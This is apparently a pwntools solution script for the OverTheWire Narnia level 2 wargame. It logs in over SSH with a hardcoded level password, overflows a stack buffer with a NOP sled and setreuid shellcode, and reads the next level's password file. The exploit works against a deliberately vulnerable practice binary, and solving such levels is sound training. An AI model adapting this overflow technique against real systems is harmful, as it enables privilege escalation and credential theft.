#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia2', 
            'narnia.labs.overthewire.org', 
            password='nairiepecu',
            port=2226)

ShellCode = pwn.asm(
            pwn.shellcraft.i386.linux.setreuid(14003) + 
            pwn.shellcraft.i386.linux.sh()
)

n=pwn.cyclic_find(0x6261616b)
arg=(b'\x90'*n+ShellCode)[-n:]+pwn.p32(0xffffddc0+20)
p = s.process([b'/narnia/narnia2', arg])
p.sendline(b"cat /etc/narnia_pass/narnia3")
print(p.recvline())
s.close()
